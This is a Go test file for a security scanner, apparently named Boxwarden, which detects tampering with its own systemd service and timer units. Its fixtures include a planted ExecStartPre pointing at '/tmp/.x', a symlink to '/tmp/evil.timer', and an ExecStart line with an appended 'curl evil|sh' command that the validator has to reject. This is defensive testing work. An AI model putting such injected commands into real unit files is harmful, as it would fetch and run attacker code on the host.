package check

import (
	"os"
	"path/filepath"
	"testing"
)

func TestOwnUnits(t *testing.T) {
	root := t.TempDir()
	scan := "[Unit]\nDescription=Boxwarden security scan\nAfter=network-online.target\n\n[Service]\nType=oneshot\nExecStart=/usr/local/bin/boxwarden scan --push --skip cve\nProtectSystem=strict\nNice=10\n"
	write(t, root, "etc/systemd/system/boxwarden-scan.service", scan)
	write(t, root, "etc/systemd/system/boxwarden-cve.service", "[Service]\nExecStart=/usr/local/bin/boxwarden scan --push --checks cve\n")
	write(t, root, "etc/systemd/system/boxwarden-metrics.service", "[Service]\nExecStart=/usr/local/bin/boxwarden metrics --push\nExecStartPre=/tmp/.x\n")
	write(t, root, "etc/systemd/system/boxwarden-scan.timer", "[Timer]\nOnBootSec=2min\nOnUnitActiveSec=15min\n[Install]\nWantedBy=timers.target\n")
	os.MkdirAll(filepath.Join(root, "etc/systemd/system/timers.target.wants"), 0o755)
	os.Symlink("/etc/systemd/system/boxwarden-scan.timer", filepath.Join(root, "etc/systemd/system/timers.target.wants/boxwarden-scan.timer"))
	os.Symlink("/tmp/evil.timer", filepath.Join(root, "etc/systemd/system/timers.target.wants/boxwarden-cve.timer"))

	got := map[string]bool{}
	for _, f := range ownUnitFindings(root) {
		got[f.Title] = true
	}
	want := []string{
		"Boxwarden's own unit was modified: /etc/systemd/system/boxwarden-metrics.service",
		"Boxwarden's own unit was modified: /etc/systemd/system/timers.target.wants/boxwarden-cve.timer",
	}
	if len(got) != len(want) || !got[want[0]] || !got[want[1]] {
		t.Errorf("got %v", got)
	}
	if p := unitProblem("[Service]\nExecStart=/usr/local/bin/boxwarden scan --push; curl evil|sh\n"); p == "" {
		t.Error("extra command in ExecStart accepted")
	}

	// They stay out of the baseline: an update must not look like a break-in.
	if snap := Collect(root); snap["file"]["/etc/systemd/system/boxwarden-scan.service"] != "" {
		t.Error("own unit in the baseline")
	}
}
